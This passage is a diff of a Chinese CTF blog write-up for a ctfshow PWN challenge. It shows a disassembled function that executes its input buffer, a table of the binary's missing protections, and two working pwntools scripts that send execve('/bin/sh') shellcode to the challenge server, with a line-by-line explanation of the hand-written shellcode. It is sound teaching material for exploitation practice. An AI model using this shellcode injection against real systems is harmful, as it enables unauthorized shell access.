+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132↓p</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这代码是在看不懂可以上AI嗦一下，让它帮你解析一下，毕竟刚入门&hellip;&hellip;（这段代码是 IDA 反编译出的 32 位 x86 架构程序中<code>ctfshow</code>函数）</p>
+<p>checksec一下：记住上面的参数，后面写exp要用&hellip;</p>
+<p><img src="/p/ctfshow-pwn-writeup/62.png"
+	width="675"
+	height="180"
+	srcset="/p/ctfshow-pwn-writeup/62_hu_384015e3cc48e.png 480w, /p/ctfshow-pwn-writeup/62_hu_8910832fcad885ea.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="375"
+		data-flex-basis="900px"
+	
+></p>
+<p>可知，对这些保护有点遗忘的可以回去看<a class="link" href="https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6"  target="_blank" rel="noopener"
+    >PWN-1的Linux安全保护机制</a></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>保护项</th>
+          <th>状态</th>
+          <th>对利用的影响</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Arch</td>
+          <td>i386-32-Little</td>
+          <td>32 位 x86 架构，shellcode 需用 32 位版本（对应<code>shellcraft.i386.sh()</code>）</td>
+      </tr>
+      <tr>
+          <td>Canary（栈溢出保护）</td>
+          <td>No canary found</td>
+          <td>无栈溢出保护，缓冲区溢出后可直接覆盖栈上数据（无需绕过 canary）</td>
+      </tr>
+      <tr>
+          <td>NX（栈不可执行）</td>
+          <td>NX disabled</td>
+          <td>栈段可执行，shellcode 直接放在栈上就能运行（无需 ROP 绕过 NX）</td>
+      </tr>
+      <tr>
+          <td>PIE（地址随机化）</td>
+          <td>No PIE (0x8048000)</td>
+          <td>程序地址固定，<code>ctfshow</code>函数、<code>buf</code>缓冲区地址不会变（无需泄露地址）</td>
+      </tr>
+      <tr>
+          <td>RWX segments</td>
+          <td>Has RWX segments</td>
+          <td>存在 “可读可写可执行” 的内存段，进一步确保 shellcode 能正常执行</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>总结</strong>：程序保护机制极弱，直接用 “栈溢出注入 shellcode” 即可，无需复杂绕过。</p>
+<p>回到本题目，在nc连接之后交互一会发现并无实际效果，PWN大致思路是找到后门函数或者系统调用函数进行<code>提权</code>，提权之后就进行交互去执行一些靶机的终端命令例如：cat ctfshow_flag、ls之类的。那在此之前都得先找到这“后门”，也就是/bin/sh、zsh、system函数等等，但我发现这个程序并无这些地址存在，所以说这个程序从被制造出来都没想过要执行这些有关提权的代码&hellip;..</p>
+<p><img src="/p/ctfshow-pwn-writeup/66.png"
+	width="1650"
+	height="625"
+	srcset="/p/ctfshow-pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, /p/ctfshow-pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w"
+	loading="lazy"
+	
+		alt="全篇搜索/bin/sh字符串"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="633px"
+	
+></p>
+<p>因为NX、canary没开、又有RWX，注入一段我们设计的有关执行/bin/sh的exp还是可以的，大致思路有了，接下来开始执行吧。</p>
+<p><strong>围绕 “直接执行 shellcode” 设计方案</strong></p>
+<p>可以用pwntools的脚本啊，单纯直接调用函数的，而且pwntools有局限啊，就那用这个pwntools的shellcraft模块生成的shellcode比较晦涩难懂，而且注释放到Kali上比较杂乱，而且没有涉及到汇编语言调用，比较简单我就不用了，我这里手敲shellcode方便大家了解一下底层逻辑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># 导入 pwntools 库</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span> <span class="c1"># 设置日志级别为调试模式</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;) # 本地连接</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28176</span><span class="p">)</span> <span class="c1"># 远程连接</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0xb      
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ecx, 0       
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov edx, 0       
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0068732f  
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6e69622f   
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, esp    
+</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80         
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span> <span class="c1"># 生成一个 Shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># 将生成的 Shellcode 发送到目标</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建一个python文件，输入这些代码放到终端上运行，记得提前打开另外一个窗口进行nc连接远程靶机。</p>
+<p>上面其它的python代码没啥可讲的，这是远程交互的模板代码，直接套就好，我现在重在讲解这个手搓的shellcode，它和shellcraft模块产生的shellcode效果一样的，而且还好看懂：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      <span class="c1">; syscall号：11对应execve</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; argv参数为NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; envp参数为NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x0068732f</span>   <span class="c1">; 压栈字符串&#34;/sh\0&#34;（小端序存储）</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x6e69622f</span>   <span class="c1">; 压栈字符串&#34;/bin&#34;（小端序存储）</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>      <span class="c1">; ebx指向栈顶的&#34;/bin/sh&#34;字符串地址</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>          <span class="c1">; 触发系统调用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote class="alert alert-note">
+    <blockquote>
+<p>这 7 行代码通过精准设置寄存器和栈数据，完成了<code>execve</code>系统调用的参数准备，最终实现 “用<code>/bin/sh</code>替换当前进程” 的效果，是 CTF 中获取 shell 的基础手段，逻辑清晰且精简（仅 23 字节）。</p></blockquote></blockquote>
+<h4 id="逐行解析手敲shellcode">逐行解析手敲shellcode
+</h4><p>思路：注入一段能执行/bin/sh的汇编语言代码</p>
+<p>① <code>mov eax, 0xb</code></p>
+<ul>
+<li><code>eax</code>寄存器在 32 位 Linux 系统调用中专门用于传递 “系统调用号”（告诉内核要执行哪个系统调用）。</li>
+<li><code>0xb</code>是十六进制，转换为十进制是<code>11</code>，而<code>11</code>正是<code>execve</code>系统调用对应的编号（内核通过这个值识别要执行<code>execve</code>）。</li>
+</ul>
+<p>② <code>mov ecx, 0</code></p>
+<ul>
+<li><code>ecx</code>寄存器用于传递<code>execve</code>的第二个参数<code>argv</code>（参数列表）。</li>
+<li>传<code>0</code>（即<code>NULL</code>）表示 “没有参数”，等价于在命令行直接输入<code>/bin/sh</code>（不带任何参数）。</li>
+</ul>
+<p>③ <code>mov edx, 0</code></p>
+<ul>
+<li><code>edx</code>寄存器用于传递<code>execve</code>的第三个参数<code>envp</code>（环境变量列表）。</li>
+<li>传<code>0</code>（即<code>NULL</code>）表示 “没有环境变量”，内核会使用默认环境变量。</li>
+</ul>
+<p>④ <code>push 0x0068732f</code></p>
+<ul>
+<li>
+<p><code>push</code>指令将数据压入栈中（栈是向下增长的内存区域）。</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0068732f</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>是十六进制的 “小端序” 存储（x86 架构默认小端序，即低地址存低位字节），转换为 ASCII 码：</p>
+<ul>
+<li><code>0x2f</code> → <code>/</code></li>
+<li><code>0x73</code> → <code>s</code></li>
+<li><code>0x68</code> → <code>h</code></li>
+<li><code>0x00</code> → 字符串结束符<code>\0</code>
+所以这行实际是往栈上压入字符串<code>&quot;/sh\0&quot;</code>。</li>
+</ul>
+</li>
+</ul>
+<p>⑤ <code>push 0x6e69622f</code></p>
+<ul>
+<li>
+<p>同样是压栈操作，<code>0x6e69622f</code>转换为 ASCII 码：</p>
+<ul>
+<li><code>0x2f</code> → <code>/</code></li>
+<li><code>0x62</code> → <code>b</code></li>
+<li><code>0x69</code> → <code>i</code></li>
+<li><code>0x6e</code> → <code>n</code>
+所以这行往栈上压入字符串<code>&quot;/bin&quot;</code>。</li>
+</ul>
+<p>结合上一行，栈上现在的内容是<code>&quot;/bin/sh\0&quot;</code>（因为栈先压入<code>&quot;/bin&quot;</code>，再压入<code>&quot;/sh\0&quot;</code>，栈顶到栈底的顺序就是<code>/b/i/n//s/h/\0</code>）。</p>
+</li>
+</ul>
+<p>⑥ <code>mov ebx, esp</code></p>
+<ul>
+<li><code>esp</code>是栈指针寄存器，永远指向当前栈顶的地址。</li>
+<li>经过两次<code>push</code>后，栈顶正好是<code>&quot;/bin/sh\0&quot;</code>字符串的起始地址（第一个字符<code>'/'</code>的位置）。</li>
+<li>这行指令将栈顶地址存入<code>ebx</code>，而<code>ebx</code>寄存器在<code>execve</code>系统调用中用于传递第一个参数<code>filename</code>（程序路径），所以<code>ebx</code>现在指向我们要执行的<code>&quot;/bin/sh&quot;</code>。</li>
+</ul>
+<p>⑦ <code>int 0x80</code></p>
+<ul>
+<li><code>int</code>是中断指令，<code>0x80</code>是 Linux 系统调用的中断号。</li>
+<li>执行这条指令会触发一个软中断，让 CPU 从用户态切换到内核态，内核会根据<code>eax</code>中的系统调用号（<code>11</code>）执行<code>execve</code>，并使用<code>ebx</code>、<code>ecx</code>、<code>edx</code>中的参数。</li>
+</ul>
+<p>总之：必须要定义好这几个寄存器，在最底层操作系统运行时都会用到的，这里不详细讲述，反正你知道这几个寄存器一开始就得这么定义就好啦。（不耐烦了）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>       
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>push压栈时要记得字节限制，因为架构是x32，所以push最多4个字节，也就是push两个：/bin、/sh的地址（不满四个字节如/sh要记得用00填满哦不然会报错）</p>
+<p>然后就是记得esp寄存器是动态的&hellip;</p>
+<p>这是调用pwntools的shellcraft模块的exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># 设置日志级别为debug，会输出详细的交互过程</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)  # 本地调试时启用，用于启动本地的pwn程序</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28183</span><span class="p">)</span>  <span class="c1"># 连接远程目标服务，地址为pwn.challenge.ctf.show，端口28183</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># 生成一个执行/bin/sh的shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>  <span class="c1"># 将shellcode发送给目标服务</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># 进入交互模式，允许用户与目标服务进行交互（如执行命令）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是它的shellcode（原版未修改过，直接复制粘贴上来的）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">        /* execve<span class="o">(</span><span class="nv">path</span><span class="o">=</span><span class="s1">&#39;/bin///sh&#39;</span>, <span class="nv">argv</span><span class="o">=[</span><span class="s1">&#39;sh&#39;</span><span class="o">]</span>, <span class="nv">envp</span><span class="o">=</span>0<span class="o">)</span> */
+</span></span><span class="line"><span class="cl">        /* push b<span class="s1">&#39;/bin///sh\x00&#39;</span> */
+</span></span><span class="line"><span class="cl">        push 0x68
+</span></span><span class="line"><span class="cl">        push 0x732f2f2f
+</span></span><span class="line"><span class="cl">        push 0x6e69622f
+</span></span><span class="line"><span class="cl">        mov ebx, esp
+</span></span><span class="line"><span class="cl">        /* push argument array <span class="o">[</span><span class="s1">&#39;sh\x00&#39;</span><span class="o">]</span> */
+</span></span><span class="line"><span class="cl">        /* push <span class="s1">&#39;sh\x00\x00&#39;</span> */
+</span></span><span class="line"><span class="cl">        push 0x1010101
+</span></span><span class="line"><span class="cl">        xor dword ptr <span class="o">[</span>esp<span class="o">]</span>, 0x1016972
+</span></span><span class="line"><span class="cl">        xor ecx, ecx
+</span></span><span class="line"><span class="cl">        push ecx /* null terminate */
+</span></span><span class="line"><span class="cl">        push <span class="m">4</span>
+</span></span><span class="line"><span class="cl">        pop ecx
+</span></span><span class="line"><span class="cl">        add ecx, esp
+</span></span><span class="line"><span class="cl">        push ecx /* <span class="s1">&#39;sh\x00&#39;</span> */
+</span></span><span class="line"><span class="cl">        mov ecx, esp
+</span></span><span class="line"><span class="cl">        xor edx, edx
+</span></span><span class="line"><span class="cl">        /* call execve<span class="o">()</span> */
+</span></span><span class="line"><span class="cl">        push <span class="m">11</span> /* 0xb */
+</span></span><span class="line"><span class="cl">        pop eax
+</span></span><span class="line"><span class="cl">        int 0x80
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/65.png"
+	width="1030"
+	height="560"
+	srcset="/p/ctfshow-pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, /p/ctfshow-pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w"
+	loading="lazy"
+	
+		alt="调用pwntools所产生的shellcode"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="441px"
+	
+></p>
+<p>看着确实比较乱&hellip;..😅</p>
+<p>最后的最后我想对这题做些评价加，其实不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄</p>
+<p><img src="/p/ctfshow-pwn-writeup/67.png"
+	width="856"
+	height="304"
+	srcset="/p/ctfshow-pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, /p/ctfshow-pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w"
+	loading="lazy"
+	
+		alt="顺利完成execve系统调用，得以进行交互"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="675px"
+	
+></p>
+<p>大致思路知道就好，靶机的flag是动态变化的。</p>
+<h3 id="pwn_025">PWN_025
+</h3><p>题目：开启NX保护，或许可以试试ret2libc</p>
+<p><a class="link" href="PWN_025" >PWN_025</a></p>
 
 </section>
 
@@ -2051,7 +2858,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-08-28
+            最后更新于 2025-08-29
         </span>
     </section></footer>
 
@@ -2305,7 +3112,7 @@ unicode: "ece7"
 <section class="wordcount">
   <div class="wordcount-row">
     <p>博主发布了7篇文章  ||</p>
-    <p>总共72.43k 字</p>
+    <p>总共79.22k 字</p>
   </div>
 </section>
         
